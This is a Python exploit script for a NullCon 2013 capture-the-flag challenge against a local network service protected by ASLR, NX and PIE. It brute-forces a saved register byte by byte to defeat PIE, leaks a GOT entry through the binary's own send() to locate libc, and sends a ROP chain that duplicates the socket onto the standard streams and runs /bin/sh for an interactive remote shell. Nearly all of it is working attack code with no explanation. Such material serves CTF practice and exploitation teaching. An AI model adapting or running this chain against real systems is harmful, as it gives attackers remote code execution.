#!/usr/bin/python
#
# NullCon 2013 CTF - Battle Underground
# Exploitation 5 - 500 points (ASLR/NX/PIE)
# danigargu @ w3b0n3s
#
# Thanks to Eloi Sanfelix - http://www.limited-entropy.com/
#

import os
import sys
import time
import socket
import string
from struct import pack,unpack

host = '127.0.0.1'
port = 6666
padding = 'A'*24

p = lambda x : pack("<L", x)   # pack
u = lambda x : unpack("<L", x) # unpack


def get_connection(ip, port):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((ip,port))
	return s

def send_user(s, user):
	s.recv(256)        # recv banner
	s.send(user)       # send user
	return s.recv(256)

def interact_shell(s):
	while True:
		try:
			sys.stdout.write("$ ")
			sys.stdout.flush()
			c = sys.stdin.readline()
			s.send(c)
			time.sleep(0.5)
			sys.stdout.write(s.recv(4096))
		except KeyboardInterrupt, e:
			print " quit"
			s.close()
			break

def find_ebx():
	ebx = ""
	s = get_connection(host, port)
	base_resp = send_user(s, "xXx")  # Response: 'Password: '
	print "[*] Base response: " + repr(base_resp)
	s.close()

	while len(ebx)<4:
		for i in xrange(0,256):

			# skip 0xac --> BAD BYTE!!
			if i == 172:
				continue

			try:
				s = get_connection(host, port)
				resp = send_user(s, padding + ebx + chr(i))
				s.close()

				if resp == base_resp:
					ebx = ebx + chr(i)
					print "[*] EBX value is 0x%s" % ebx[::-1].encode("hex")
					break
			except socket.error:
				#print "socket error"
				pass
		if i==255:
			print "[*] Could not discover ebx value. Exploit failed."
			sys.exit(-1)
	return ebx

def get_rop(libc):

	# dup2 to the three standard I/O FD (STDIN, STDOUT, STDERR)
	# dup2(4,0)
	rop = p(libc + 0x000c6c90)  # dup2()
	rop += p(libc + 0x0002c0f5) # pop esi ; pop edi ; ret --> clean args
	rop += p(4)                 # int oldfd
	rop += p(0)                 # int newfd

	# dup2(4,1)
	rop += p(libc + 0x000c6c90) # dup2()
	rop += p(libc + 0x0002c0f5) # pop esi ; pop edi ; ret --> clean args
	rop += p(4)                 # int oldfd
	rop += p(1)                 # int newfd

	# dup2(4,2)
	rop += p(libc + 0x000c6c90) # dup2()
	rop += p(libc + 0x0002c0f5) # pop esi ; pop edi ; ret --> clean args
	rop += p(4)                 # int oldfd
	rop += p(2)                 # int newfd

	# generated by ROPgadget 4.0
	# execve("/bin//sh", ["/bin/sh", NULL], [NULL])
	rop += p(libc + 0x00001a9e) # pop %edx ; ret
	rop += p(libc + 0x0015f9a0) # @ .data
	rop += p(libc + 0x00020aec) # pop %eax ; ret
	rop += "/bin" # /bin
	rop += p(libc + 0x00091e8e) # mov %eax,(%edx) ; pop %ebp ; ret
	rop += "AAAA" # padding
	rop += p(libc + 0x00001a9e) # pop %edx ; ret
	rop += p(libc + 0x0015f9a4) # @ .data + 4
	rop += p(libc + 0x00020aec) # pop %eax ; ret
	rop += "/shA" # /shA
	rop += p(libc + 0x00091e8e) # mov %eax,(%edx) ; pop %ebp ; ret
	rop += "AAAA" # padding
	rop += p(libc + 0x00001a9e) # pop %edx ; ret
	rop += p(libc + 0x0015f9a7) # @ .data + 7
	rop += p(libc + 0x0003c98e) # xor %eax,%eax ; ret
	rop += p(libc + 0x00091e8e) # mov %eax,(%edx) ; pop %ebp ; ret
	rop += "AAAA" # padding
	rop += p(libc + 0x00078af4) # pop %ebx ; ret
	rop += p(libc + 0x0015f9a0) # @ .data
	rop += p(libc + 0x000e2c01) # pop %edx ; pop %ecx ; pop %ebx ; ret
	rop += "AAAA" # padding
	rop += p(libc + 0x0015f9a7) # @ .data + 7
	rop += p(libc + 0x0015f9a0) # @ .data     ---> wrong padding!!
	rop += p(libc + 0x00001a9e) # pop %edx ; ret
	rop += p(libc + 0x0015f9a7) # @ .data + 7

	# small change
	rop += p(libc + 0x00020aec) # pop eax ; ret
	rop += p(0xb)               # execve syscall
	rop += p(libc + 0x0002a9d5) # int $0x80

	return rop

def main():
	ebx = find_ebx()
	base = u(ebx)[0] - 0x2ff4   # .text
	send_plt = p(base + 0x8c4)  # send PLT entry
	got_base = p(base + 0x3000) # GOT start

	print "[*] Binary base: 0x%.8x" % base
	print "[*] PLT entry for 'send' @ 0x%s" % send_plt[::-1].encode('hex')
	print "[*] GOT start @ 0x%s" % got_base[::-1].encode("hex")

	# get address of sigemptyset from the libc
	send = send_plt   # send()
	send += "AAAA"    # RET
	send += p(4)      # int sockfd
	send += got_base  # const void *buf
	send += p(4)      # size_t len
	send += p(0)      # int flags

	s = get_connection(host, port)
	resp = send_user(s, padding + ebx + "AAAA" + send)
	s.close()

	libc = u(resp[:4])[0] - 0x2b390

	print "[*] Discovered libc base: 0x%.8x" % libc
	print "[*] Launching ROP exploit"

	s = get_connection(host, port)
	s.recv(256)
	s.send(padding + ebx + "AAAA" + get_rop(libc))
	time.sleep(0.5)
	s.send("echo TEST\n")
	x = s.recv(100)

	if "TEST" not in x:
		print "[-] Exploit failed"
		s.close()
	else:
		print "[+] SUCESS! We have a shell\n"
		interact_shell(s)

if __name__ == "__main__":
	main()

